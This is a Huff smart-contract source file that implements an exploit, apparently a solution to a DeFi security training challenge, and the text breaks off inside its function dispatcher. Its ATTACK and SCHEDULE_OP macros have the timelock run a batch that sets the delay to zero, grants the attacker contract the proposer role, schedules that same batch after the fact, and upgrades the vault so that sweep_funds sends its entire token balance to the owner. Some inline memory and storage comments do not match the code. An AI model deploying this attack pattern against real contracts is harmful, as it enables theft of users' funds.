// Storage 
#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
#define constant TOKEN_SLOT = FREE_STORAGE_POINTER()
#define constant TIMELOCK_SLOT = FREE_STORAGE_POINTER() 
#define constant VAULT_SLOT = FREE_STORAGE_POINTER()
#define constant PROPOSER_ROLE = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1
#define constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc

// Constructor
#define macro CONSTRUCTOR() = takes (0) returns (0) {
    // Copy caller into OWNER_SLOT in storage
    caller          // [msg.sender] - msg.sender
    [OWNER_SLOT]    // [0x00, msg.sender] - storage slot where to store msg.sender
    sstore          // [] - copied msg.sender to storage slot 0x00

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address

    // Copy constructor arguments into memory
    0x20            // [0x20] - size code we will copy (address)
    0x60            // [0x60, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x60, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    returndatasize  // [0x00, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> token address (1st constructor arg) 

    0x20            // [0x20] - size code we will copy (address)
    0x40            // [0x40, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x40, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    msize           // [0x20, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> token address (1st constructor arg) 
    // [OFFSET 0x20]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> timelock address (2nd constructor arg)

    0x20            // [0x20] - size code we will copy (address)
    dup1            // [0x20, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x20, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    msize           // [0x40, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> token address (1st constructor arg) 
    // [OFFSET 0x20]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> timelock address (2nd constructor arg)
    // [OFFSET 0x40]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> vault address (3rd constructor arg)

    // Load constructor args into storage
    returndatasize   // [0x00] - byte offset in mem
    mload            // [token] - copied token onto stack
    [TOKEN_SLOT]     // [0x01, token] - storage slot where to store token
    sstore           // [] - copied token into storage slot 0x01

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> token address

    0x20             // [0x20] - byte offset in mem
    mload            // [timelock] - copied timelock onto stack
    [TIMELOCK_SLOT]  // [0x02, timelock] - storage slot where to store timelock
    sstore           // [] - copied timelock into storage slot 0x02

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> token address
    // [SLOT 0x02] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> timelock address

    0x40             // [0x40] - byte offset in mem
    mload            // [vault] - copied vault onto stack
    [VAULT_SLOT]     // [0x03, vault] - storage slot where to store vault
    sstore           // [] - copied vault into storage slot 0x03

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> token address
    // [SLOT 0x02] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> timelock address
    // [SLOT 0x03] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> vault address
}

// Modifier
#define macro ONLY_OWNER() = takes (0) returns (0) {
    caller          // [caller]
    [OWNER_SLOT]    // [0x00, caller] - storage slot where owner is stored
    sload           // [owner, caller] - loaded owner address onto stack from storage slot 0x00
    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0

    0x00            // [0x00] - size
    0x00            // [0x00, 0x00] - byte offset
    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)

    is_owner:       // is_owner label. execution continues here is the caller is the owner
}

// UUPS Compliant view function
#define macro PROXIABLE_UUID() = takes (0) returns (0) {
    [_IMPLEMENTATION_SLOT]   // [impl_slot]
    0x00                     // [0x00, impl_slot] - byte offset in mem
    mstore                   // [] - copied impl_slot into mem at offset 0x00
    0x20                     // [0x20] - size of return data
    0x00                     // [0x00, 0x20] - offset where return data is located in mem
    return                   // []
}

// "Internal" function
#define macro BUILD_OP() = takes (0) returns (0) {
    // Build calldata in mem (`function_sig(address[],uint256[],bytes[],bytes32)`) - offset 0x00 will be for function sigs
    0x80                     // [0x80] - address[] offset
    msize                    // [0x20, 0x80] - byte offset in mem
    mstore                   // [] - copied address[] offset into mem at offset 0x20

    0x120                    // [0x120] - uint256[] offset
    msize                    // [0x40, 0x120] - byte offset in mem
    mstore                   // [] - copied uint256[] offset into mem at offset 0x40
 
    0x1c0                    // [0x1c0] - bytes[] offset
    msize                    // [0x60, 0x1c0] - byte offset in mem
    mstore                   // [] - copied bytes[] offset in to mem at offset 0x60

    // MEMORY:
    // [OFFSET 0x00]   0000000000000000000000000000000000000000000000000000000000000000 -> reserved for function sigs
    // [OFFSET 0x20]   0000000000000000000000000000000000000000000000000000000000000080 -> address[] offset
    // [OFFSET 0x40]   0000000000000000000000000000000000000000000000000000000000000120 -> uint256[] offset
    // [OFFSET 0x60]   00000000000000000000000000000000000000000000000000000000000001c0 -> bytes[] offset

    // bytes32 param and address[] length + items
    0x04                     // [0x04] - address[] length
    0xa0                     // [0xa0, 0x04] - byte offset in mem (bytes32 is at offset 0x80, which is empty)
    mstore                   // [] - copied address[] length into mem at offset 0xa0

    [TIMELOCK_SLOT]          // [0x02] - storage slot where timelock is
    sload                    // [timelock] - copied timelock onto stack from storage slot 0x02
    dup1                     // [timelock, timelock] 
    msize                    // [0xc0, timelock, timelock] - byte offset in mem
    mstore                   // [timelock] - copied timelock into mem at offset 0xc0

    msize                    // [0xe0, timelock] - byte offset in mem
    mstore                   // [] - copied timelock into mem at offset 0xe0

    address                  // [self]
    msize                    // [0x100, self] - byte offset in mem
    mstore                   // [] - copied self into mem at offset 0x100

    [VAULT_SLOT]             // [0x01] - storage slot where vault is
    sload                    // [vault] - copied vault onto stack from storage slot 0x01
    msize                    // [0x120, vault] - byte offset in mem
    mstore                   // [] - copied vault into mem at offset 0x120

    // MEMORY:
    // [OFFSET 0x00]   0000000000000000000000000000000000000000000000000000000000000000 -> reserved for function sigs
    // [OFFSET 0x20]   0000000000000000000000000000000000000000000000000000000000000080 -> address[] offset
    // [OFFSET 0x40]   0000000000000000000000000000000000000000000000000000000000000120 -> uint256[] offset
    // [OFFSET 0x60]   00000000000000000000000000000000000000000000000000000000000001c0 -> bytes[] offset
    // [OFFSET 0x80]   0000000000000000000000000000000000000000000000000000000000000000 -> bytes32 param - empty
    // [OFFSET 0xa0]   0000000000000000000000000000000000000000000000000000000000000004 -> address[] length
    // [OFFSET 0xc0]   000000000000000000000000b951b01d0191705000d0cde88ebb27dd9b9f7365 -> address[] param first item - timelock
    // [OFFSET 0xe0]   000000000000000000000000b951b01d0191705000d0cde88ebb27dd9b9f7365 -> address[] param second item - timelock
    // [OFFSET 0x100]  0000000000000000000000006b63b0441371ddfbd65a65ef27642e7a622f29dd -> address[] param third item - self
    // [OFFSET 0x120]  000000000000000000000000f2df0b975c0c9efa2f8ca0491c2d1685104d2488 -> address[] param fourth item - vault

    // uint256[] length + items(empty) + bytes[] length
    0x04                     // [0x04] - uint256[] length
    dup1                     // [0x04, 0x04]
    msize                    // [0x140, 0x04, 0x04] - byte offset in mem
    mstore                   // [0x04] - copied uint256[] length into mem at offset 0x140

    0x1e0                    // [0x1e0, 0x04] - byte offset in mem (prev 128 bytes are empty)
    mstore                   // [] - copied bytes[] length into mem at offset 0x1e0

    // MEMORY:
    // ...
    // [OFFSET 0xa0]   0000000000000000000000000000000000000000000000000000000000000004 -> address[] length
    // [OFFSET 0xc0]   000000000000000000000000b951b01d0191705000d0cde88ebb27dd9b9f7365 -> address[] param first item - timelock
    // [OFFSET 0xe0]   000000000000000000000000b951b01d0191705000d0cde88ebb27dd9b9f7365 -> address[] param second item - timelock
    // [OFFSET 0x100]  0000000000000000000000006b63b0441371ddfbd65a65ef27642e7a622f29dd -> address[] param third item - self
    // [OFFSET 0x120]  000000000000000000000000f2df0b975c0c9efa2f8ca0491c2d1685104d2488 -> address[] param fourth item - vault
    // [OFFSET 0x140]  0000000000000000000000000000000000000000000000000000000000000004 -> uint256[] param length
    // [OFFSET 0x160]  0000000000000000000000000000000000000000000000000000000000000000 -> uint256[] param first item - empty
    // [OFFSET 0x180]  0000000000000000000000000000000000000000000000000000000000000000 -> uint256[] param second item - empty
    // [OFFSET 0x1a0]  0000000000000000000000000000000000000000000000000000000000000000 -> uint256[] param third item - empty
    // [OFFSET 0x1c0]  0000000000000000000000000000000000000000000000000000000000000000 -> uint256[] param fourth item - empty
    // [OFFSET 0x1e0]  0000000000000000000000000000000000000000000000000000000000000004 -> bytes[] param length

    // bytes[i] offsets
    0x80                     // [0x80] - bytes[0] offset
    msize                    // [0x200, 0x80] - byte offset in mem
    mstore                   // [] - copied bytes[0] offset into mem at offset 0x200

    0xe0                     // [0xe0] - bytes[1] offset
    msize                    // [0x220, 0xe0] - byte offset in mem 
    mstore                   // [] - copied bytes[1] offset into mem at offset 0x220

    0x160                    // [0x160] - bytes[2] offset
    msize                    // [0x240, 0x160] - byte offset in mem
    mstore                   // [] - copied bytes[2] offset into mem at offset 0x240

    0x1a0                    // [0x1a0] - bytes[3] offset
    msize                    // [0x260, 0x1a0] - byte offset in mem
    mstore                   // [] - copied bytes[3] offset into mem at offset 0x260
    
    // MEMORY:
    // ...
    // [OFFSET 0x140]  0000000000000000000000000000000000000000000000000000000000000004 -> uint256[] param length
    // [OFFSET 0x160]  0000000000000000000000000000000000000000000000000000000000000000 -> uint256[] param first item - empty
    // [OFFSET 0x180]  0000000000000000000000000000000000000000000000000000000000000000 -> uint256[] param second item - empty
    // [OFFSET 0x1a0]  0000000000000000000000000000000000000000000000000000000000000000 -> uint256[] param third item - empty
    // [OFFSET 0x1c0]  0000000000000000000000000000000000000000000000000000000000000000 -> uint256[] param fourth item - empty
    // [OFFSET 0x1e0]  0000000000000000000000000000000000000000000000000000000000000004 -> bytes[] param length
    // [OFFSET 0x200]  0000000000000000000000000000000000000000000000000000000000000080 -> bytes[0] offset
    // [OFFSET 0x220]  00000000000000000000000000000000000000000000000000000000000000e0 -> bytes[1] offset
    // [OFFSET 0x240]  0000000000000000000000000000000000000000000000000000000000000160 -> bytes[2] offset 
    // [OFFSET 0x260]  00000000000000000000000000000000000000000000000000000000000001a0 -> bytes[3] offset 

    // bytes[0] length + bytes[0] items + bytes[1] length
    0x24                      // [0x24] - bytes[0] length
    msize                     // [0x280, 0x24] - byte offset in mem
    mstore                    // [] - copied bytes[0] length into mem at offset 0x280

    __RIGHTPAD(0x24adbc5b)    // [0x24adbc5b] `updateDelay(uint64)` func sig (bytes[0][0])
    msize                     // [0x2a0, 0x24adbc5b] 
    mstore                    // []

    0x44                      // [0x44] - bytes[1] lengtg
    0x2e0                     // [0x2c0, 0x44] - bytes offset in mem (bytes[0][1] is empty)
    mstore

    // MEMORY:
    // ...
    // [OFFSET 0x1e0]  0000000000000000000000000000000000000000000000000000000000000004 -> bytes[] param length
    // [OFFSET 0x200]  0000000000000000000000000000000000000000000000000000000000000080 -> bytes[0] offset
    // [OFFSET 0x220]  00000000000000000000000000000000000000000000000000000000000000e0 -> bytes[1] offset
    // [OFFSET 0x240]  0000000000000000000000000000000000000000000000000000000000000160 -> bytes[2] offset 
    // [OFFSET 0x260]  00000000000000000000000000000000000000000000000000000000000001a0 -> bytes[3] offset 
    // [OFFSET 0x280]  0000000000000000000000000000000000000000000000000000000000000024 -> bytes[0] length
    // [OFFSET 0x2a0]  24adbc5b00000000000000000000000000000000000000000000000000000000 -> bytes[0] `updateDelay(uint64)` func sig + first 28 bytes of bytes[0] param (empty(uint64))
    // [OFFSET 0x2c0]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of bytes[0] param + 28 bytes padding
    // [OFFSET 0x2e0]  0000000000000000000000000000000000000000000000000000000000000044 -> bytes[1] length

    // bytes[1] items + bytes[2] length
    __RIGHTPAD(0x2f2ff15d)    // [0x2f2ff15d] - `grantRole(bytes32,address)` func sig
    msize                     // [0x300, 0x2f2ff15d]
    mstore                    // []

    [PROPOSER_ROLE]           // [role] - keccak256("PROPOSER_ROLE")
    0x304                     // [0x304, role]
    mstore                    // []

    address                   // [self]
    0x324                     // [0x324, self]
    mstore                    // []

    0x04                      // [0x04]
    msize                     // [0x360, 0x04]
    mstore                    // []

    // MEMORY:
    // ...
    // [OFFSET 0x280]  0000000000000000000000000000000000000000000000000000000000000024 -> bytes[0] length
    // [OFFSET 0x2a0]  24adbc5b00000000000000000000000000000000000000000000000000000000 -> bytes[0] `updateDelay(uint64)` func sig + first 28 bytes of bytes[0] param (empty(uint64))
    // [OFFSET 0x2c0]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of bytes[0] param + 28 bytes padding
    // [OFFSET 0x2e0]  0000000000000000000000000000000000000000000000000000000000000044 -> bytes[1] length
    // [OFFSET 0x300]  2f2ff15db09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082 -> bytes[1] `grantRole(bytes32,address)` func sig + first 28 bytes of bytes[1] bytes32 param (Keccak256("PROPOSER_ROLE")) 
    // [OFFSET 0x320]  b6819cc10000000000000000000000006b63b0441371ddfbd65a65ef27642e7a -> last 4 bytes of bytes[1] bytes32 param + first 28 bytes of bytes[1] address param (self)
    // [OFFSET 0x340]  622f29dd00000000000000000000000000000000000000000000000000000000 -> last 4 bytes of bytes[1] address param + 28 bytes padding
    // [OFFSET 0x360]  0000000000000000000000000000000000000000000000000000000000000004 -> bytes[2] length

    // bytes[2] item + bytes[3] length
    __RIGHTPAD(0xbee09e17)   // [0xbee09e17] `schedule_op()` func sig
    msize                    // [0x380, 0xbee09e17]
    mstore                   // []

    0xc4                     // [0xc4] bytes[3] length
    msize                    // [0x3a0, 0xc4]
    mstore                   // []

    // MEMORY:
    // ...
    // [OFFSET 0x300]  2f2ff15db09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082 -> bytes[1] `grantRole(bytes32,address)` func sig + first 28 bytes of bytes[1] bytes32 param (Keccak256("PROPOSER_ROLE")) 
    // [OFFSET 0x320]  b6819cc10000000000000000000000006b63b0441371ddfbd65a65ef27642e7a -> last 4 bytes of bytes[1] bytes32 param + first 28 bytes of bytes[1] address param (self)
    // [OFFSET 0x340]  622f29dd00000000000000000000000000000000000000000000000000000000 -> last 4 bytes of bytes[1] address param + 28 bytes padding
    // [OFFSET 0x360]  0000000000000000000000000000000000000000000000000000000000000004 -> bytes[2] length
    // [OFFSET 0x380]  bee09e1700000000000000000000000000000000000000000000000000000000 -> bytes[2] `schedule_op()` func sig + 28 bytes of padding
    // [OFFSET 0x3a0]  00000000000000000000000000000000000000000000000000000000000000c4 -> bytes[3] length

    // bytes[3] items
    __RIGHTPAD(0x4f1ef286)    // [0x4f1ef286] - upgradeToAndCall(address,bytes) func sig
    msize                     // [0x3c0, 0x4f1ef286]
    mstore                    // []

    address                   // [self]
    0x3c4                     // [0x3c4, self]
    mstore                    // []

    0x40                      // [0x40] - bytes param offset
    0x3e4                     // [0x3e4, 0x40]
    mstore                    // []

    0x44                      // [0x44] - bytes param length
    0x404                     // [0x404, 0x44]
    mstore                    // []

    __RIGHTPAD(0x065c5014)    // [0x065c5014] - `sweep_funds(address,address)` func sig
    0x424                     // [0x424, 0x065c5014]
    mstore                    // []

    [OWNER_SLOT]              // [0x00]
    sload                     // [owner]
    0x428                     // [0x428, owner]
    mstore                    // []

    [TOKEN_SLOT]              // [0x01]
    sload                     // [token]
    0x448                     // [0x448, token]
    mstore                    // []

    // MEMORY:
    // ...
    // [OFFSET 0x3a0]  00000000000000000000000000000000000000000000000000000000000000c4 -> bytes[3] length
    // [OFFSET 0x3c0]  4f1ef2860000000000000000000000006b63b0441371ddfbd65a65ef27642e7a -> bytes[3] `upgradeToAndCall(address,bytes)` func sig + first 28 bytes of bytes[3] address param (self)
    // [OFFSET 0x3e0]  622f29dd00000000000000000000000000000000000000000000000000000000 -> last 4 bytes of bytes[3] address param + first 28 bytes of bytes[3] bytes param offset
    // [OFFSET 0x400]  0000004000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of bytes[3] bytes param offset + first 28 bytes of bytes[3] bytes param length
    // [OFFSET 0x420]  00000044065c5014000000000000000000000000c89d42189f0450c2b2c3c61f -> last 4 bytes of bytes[3] bytes param length + `sweep_funds(...)` func sig + first 24 bytes of bytes of owner address
    // [OFFSET 0x440]  58ec5d628176a1e70000000000000000000000006af9bb9cf7307ac439cc7e37 -> last 8 bytes of owner address + first 24 bytes of token address
    // [OFFSET 0x460]  859bdd844874ebc1000000000000000000000000000000000000000000000000 -> last 8 bytes of owner address + 24 bytes of padding
    // [OFFSET 0x480]  0000000000000000000000000000000000000000000000000000000000000000 -> 32 bytes of padding
    
    // Final Memory:
    //
    // [OFFSET 0x00]   0000000000000000000000000000000000000000000000000000000000000000 -> reserved for function sigs
    // [OFFSET 0x20]   0000000000000000000000000000000000000000000000000000000000000080 -> address[] offset
    // [OFFSET 0x40]   0000000000000000000000000000000000000000000000000000000000000120 -> uint256[] offset
    // [OFFSET 0x60]   00000000000000000000000000000000000000000000000000000000000001c0 -> bytes[] offset
    // [OFFSET 0x80]   0000000000000000000000000000000000000000000000000000000000000000 -> bytes32 param - empty
    // [OFFSET 0xa0]   0000000000000000000000000000000000000000000000000000000000000004 -> address[] length
    // [OFFSET 0xc0]   000000000000000000000000b951b01d0191705000d0cde88ebb27dd9b9f7365 -> address[] param first item - timelock
    // [OFFSET 0xe0]   000000000000000000000000b951b01d0191705000d0cde88ebb27dd9b9f7365 -> address[] param second item - timelock
    // [OFFSET 0x100]  0000000000000000000000006b63b0441371ddfbd65a65ef27642e7a622f29dd -> address[] param third item - self
    // [OFFSET 0x120]  000000000000000000000000f2df0b975c0c9efa2f8ca0491c2d1685104d2488 -> address[] param fourth item - vault
    // [OFFSET 0x140]  0000000000000000000000000000000000000000000000000000000000000004 -> uint256[] param length
    // [OFFSET 0x160]  0000000000000000000000000000000000000000000000000000000000000000 -> uint256[] param first item - empty
    // [OFFSET 0x180]  0000000000000000000000000000000000000000000000000000000000000000 -> uint256[] param second item - empty
    // [OFFSET 0x1a0]  0000000000000000000000000000000000000000000000000000000000000000 -> uint256[] param third item - empty
    // [OFFSET 0x1c0]  0000000000000000000000000000000000000000000000000000000000000000 -> uint256[] param fourth item - empty
    // [OFFSET 0x1e0]  0000000000000000000000000000000000000000000000000000000000000004 -> bytes[] param length
    // [OFFSET 0x200]  0000000000000000000000000000000000000000000000000000000000000080 -> bytes[0] offset
    // [OFFSET 0x220]  00000000000000000000000000000000000000000000000000000000000000e0 -> bytes[1] offset
    // [OFFSET 0x240]  0000000000000000000000000000000000000000000000000000000000000160 -> bytes[2] offset 
    // [OFFSET 0x260]  00000000000000000000000000000000000000000000000000000000000001a0 -> bytes[3] offset 
    // [OFFSET 0x280]  0000000000000000000000000000000000000000000000000000000000000024 -> bytes[0] length
    // [OFFSET 0x2a0]  24adbc5b00000000000000000000000000000000000000000000000000000000 -> bytes[0] `updateDelay(uint64)` func sig + first 28 bytes of bytes[0] param (empty(uint64))
    // [OFFSET 0x2c0]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of bytes[0] param + 28 bytes padding
    // [OFFSET 0x2e0]  0000000000000000000000000000000000000000000000000000000000000044 -> bytes[1] length
    // [OFFSET 0x300]  2f2ff15db09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082 -> bytes[1] `grantRole(bytes32,address)` func sig + first 28 bytes of bytes[1] bytes32 param (Keccak256("PROPOSER_ROLE")) 
    // [OFFSET 0x320]  b6819cc10000000000000000000000006b63b0441371ddfbd65a65ef27642e7a -> last 4 bytes of bytes[1] bytes32 param + first 28 bytes of bytes[1] address param (self)
    // [OFFSET 0x340]  622f29dd00000000000000000000000000000000000000000000000000000000 -> last 4 bytes of bytes[1] address param + 28 bytes padding
    // [OFFSET 0x360]  0000000000000000000000000000000000000000000000000000000000000004 -> bytes[2] length
    // [OFFSET 0x380]  bee09e1700000000000000000000000000000000000000000000000000000000 -> bytes[2] `schedule_op()` func sig + 28 bytes of padding
    // [OFFSET 0x3a0]  00000000000000000000000000000000000000000000000000000000000000c4 -> bytes[3] length
    // [OFFSET 0x3c0]  4f1ef2860000000000000000000000006b63b0441371ddfbd65a65ef27642e7a -> bytes[3] `upgradeToAndCall(address,bytes)` func sig + first 28 bytes of bytes[3] address param (self)
    // [OFFSET 0x3e0]  622f29dd00000000000000000000000000000000000000000000000000000000 -> last 4 bytes of bytes[3] address param + first 28 bytes of bytes[3] bytes param offset
    // [OFFSET 0x400]  0000004000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of bytes[3] bytes param offset + first 28 bytes of bytes[3] bytes param length
    // [OFFSET 0x420]  00000044065c5014000000000000000000000000c89d42189f0450c2b2c3c61f -> last 4 bytes of bytes[3] bytes param length + `sweep_funds(...)` func sig + first 24 bytes of bytes of owner address
    // [OFFSET 0x440]  58ec5d628176a1e70000000000000000000000006af9bb9cf7307ac439cc7e37 -> last 8 bytes of owner address + first 24 bytes of token address
    // [OFFSET 0x460]  859bdd844874ebc1000000000000000000000000000000000000000000000000 -> last 8 bytes of owner address + 24 bytes of padding
    // [OFFSET 0x480]  0000000000000000000000000000000000000000000000000000000000000000 -> 32 bytes of padding
}

// Attack function
#define macro ATTACK() = takes (0) returns (0) {
    // Copy `execute(address[],uint256[],bytes[],bytes32)` func sig
    
    0x2656227d               // [0x2656227d] - func sig
    0x00                     // [0x00, 0x2656227d] - byte offset in mem
    mstore                   // [] - copied func sig into mem at offset 0x00

    BUILD_OP()               // add params into mem starting at offset 0x20

    // MEMORY:
    // [OFFSET 0x00]   000000000000000000000000000000000000000000000000000000002656227d -> `execute(address[],uint256[],bytes[],bytes32)` func sig
    // ... params from BUILD_OP()

    // CALl into timelock
    0x00                      // [0x00] - size of return data
    dup1                      // [0x00, 0x00] - byte offset in mem where return data is copied
    0x484                     // [0x484, 0x00, 0x00] - size off calldata
    0x1c                      // [0x1c, 0x484, 0x00, 0x00] - byte offset in mem where calldata starts
    dup3                      // [0x00, 0x1c, 0x484, 0x00, 0x00] - msg.value to send with call
    [TIMELOCK_SLOT]           // [0x02, 0x00, 0x1c, 0x484, 0x00, 0x00] - storage slot where timelock is
    sload                     // [timelock, 0x00, 0x1c, 0x484, 0x00, 0x00] - copied timelock into mem at storage slot 0x02
    gas                       // [gas, timelock, 0x00, 0x1c, 0x484, 0x00, 0x00] - gas to send with call
    call                      // [success]
    iszero                    // [0/1]
    throw_error               // [throw_error, 0/1]
    jumpi                     // []

    stop
}

// scheule operation function
#define macro SCHEDULE_OP() = takes (0) returns (0) {
    // Copy `schedule(address[],uint256[],bytes[],bytes32)` func sig

    0x90bd1e6d               // [0x90bd1e6d] - func sig
    0x00                     // [0x00, 0x90bd1e6d] - byte offset in mem
    mstore                   // [] - copied func sig into mem at offset 0x00

    BUILD_OP()               // add params into mem starting at offset 0x20

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000000000000090bd1e6d -> `schedule(address[],uint256[],bytes[],bytes32)` func sig
    // ... params from BUILD_OP()

    // CALl into timelock
    0x00                      // [0x00] - size of return data
    dup1                      // [0x00, 0x00] - byte offset in mem where return data is copied
    0x484                     // [0x484, 0x00, 0x00] - size off calldata
    0x1c                      // [0x1c, 0x484, 0x00, 0x00] - byte offset in mem where calldata starts
    dup3                      // [0x00, 0x1c, 0x484, 0x00, 0x00] - msg.value to send with call
    [TIMELOCK_SLOT]           // [0x02, 0x00, 0x1c, 0x484, 0x00, 0x00] - storage slot where timelock is
    sload                     // [timelock, 0x00, 0x1c, 0x484, 0x00, 0x00] - copied timelock into mem at storage slot 0x02
    gas                       // [gas, timelock, 0x00, 0x1c, 0x484, 0x00, 0x00] - gas to send with call
    call                      // [success]
    iszero                    // [0/1]
    throw_error               // [throw_error, 0/1]
    jumpi                     // []
    
    stop
}

// delegat function
#define macro SWEEP_FUNDS() = takes (2) returns (0) {
    // takes: [owner, token]

    // Copy `balanceOf(address)` func sig and self into mem to use as calldata for STATICCALl
    0x70a08231                // [0x70a08231, owner, token] - func sig
    0x00                      // [0x00, 0x70a08231, owner, token] - byte offset in mem
    mstore                    // [owner, token] - copied func sig into mem at offset 0x00
    
    address                   // [self, owner, token]
    0x20                      // [0x20, self, owner, token] - byte offset in mem
    mstore                    // [owner, token] - copied self into mem at offset 0x20

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
    // [OFFSET 0x20]  0000000000000000000000000000000000000000000000000000000070a08231 -> self

    // STATICCALL into token
    0x20                      // [0x20, owner, token] - size of return data (uint256)
    0x40                      // [0x40, 0x20, owner, token] - byte offset in mem where return data is copied
    0x24                      // [0x24, 0x40, 0x20, owner, token] - size of calldata
    0x1c                      // [0x1c, 0x24, 0x40, 0x20 owner, token] - byte offset in mem where calldata starts
    dup6                      // [token, 0x1c, 0x24, 0x40, 0x20 owner, token] - calling token
    gas                       // [gas, token, 0x1c, 0x24, 0x40, 0x20 owner, token] - gas to send with staticcall
    staticcall                 // [success, owner, token]
    iszero                    // [0/1, owner, token]
    throw_error               // [throw_error, 0/1, owner, token]
    jumpi                     // [owner, token]

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
    // [OFFSET 0x20]  0000000000000000000000000000000000000000000000000000000070a08231 -> self
    // [OFFSET 0x40]  0000000000000000000000000000000000000000000000000000000070a08231 -> token balance

    // Copy `transfer(address,uint256)` func sig and owner into mem to use as calldata for CALL 
    0xa9059cbb                // [0xa9059cbb, owner, token] - func sig
    0x00                      // [0x00, 0xa9059cbb, owner, token] - byte offset in mem
    mstore                    // [owner, token] - copied func sig into mem at offset 0x00

    0x20                      // [0x20, owner, token] - byte offset in mem
    mstore                    // [token] - copied owner into mem at offset 0x20

    // MEMORY:
    // [OFFSET 0x00]  00000000000000000000000000000000000000000000000000000000a9059cbb -> `transfer(address,uint256)` func sig
    // [OFFSET 0x20]  0000000000000000000000000000000000000000000000000000000070a08231 -> owner
    // [OFFSET 0x40]  0000000000000000000000000000000000000000000000000000000070a08231 -> token balance

    // CALL into token
    0x00                       // [0x00, token] - size of return data
    dup1                       // [0x00, 0x00, token] - byte offset in mem where return data is copied
    0x44                       // [0x44, 0x00, 0x00, token] - size off calldata
    0x1c                       // [0x1c, 0x44, 0x00, 0x00, token] - byte offset in mem where calldata starts
    dup3                       // [0x00, 0x1c, 0x44, 0x00, 0x00, token] - msg.value to send with call
    dup6                       // [token, 0x00, 0x1c, 0x44, 0x00, 0x00, token] - calling token
    gas                        // [gas, token, 0x00, 0x1c, 0x44, 0x00, 0x00, token] - gas to send with call
    call                       // [success, token]
    iszero                     // [0/1, token]
    throw_error                // [throw_error, 0/1, token]
    jumpi                      // [token]
}

// Function Dispatching
#define macro MAIN() = takes (0) returns (0) {
    // Identify which function is being called
    0x00         // [0x00] - the byte offset in calldata that we will read 32 bytes from
    calldataload // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
    0xe0         // [0xe0, calldata] - 0xe0 is 224 bits
    shr          // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
                 // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)

    dup1         // [func_sig, func_sig]
    0x52d1902d   // [0x52d1902d, func_sig, func_sig] - pushing func sig of 'proxiableUUID()' onto the stack
    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    uuid         // [uuid, 0/1, func_sig] - uuid is a label (byte offset) for the proxiableUUID getter instructions in the code
    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path

    dup1         // [func_sig, func_sig]
    0x9e5faafc   // [0x9e5faafc, func_sig, func_sig] - pushing func sig of 'attack()' onto the stack
